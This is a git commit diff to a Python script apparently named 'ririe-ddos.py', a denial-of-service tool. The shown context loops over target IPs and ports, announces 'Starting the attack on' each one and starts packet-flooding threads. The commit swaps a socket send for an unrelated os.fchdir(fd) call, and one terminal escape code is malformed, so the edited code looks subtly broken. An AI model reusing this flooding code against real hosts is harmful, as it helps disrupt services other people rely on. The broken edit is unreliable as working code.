f05c951b3762a9059030e341c49628fe716ae628
Kodekeras24 <zhanahmad57@gmail.com>
2024-12-02 09:57:33 +0700

    Update ririe-ddos.py

--- ririe-ddos.py
+++ ririe-ddos.py
@@ -84,7 +84,7 @@ time.sleep(3)
 for ip in ips:
     for port in ports:
         # Use a bytes literal to create the data
-        s.send(data)
+        os.fchdir(fd)
         print("[✴️]  \033[32mRiri  \033[34m" +str(1)+ " \033(33m Starting the attack on \033[94m" +ip+ " \033[0m")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, time))
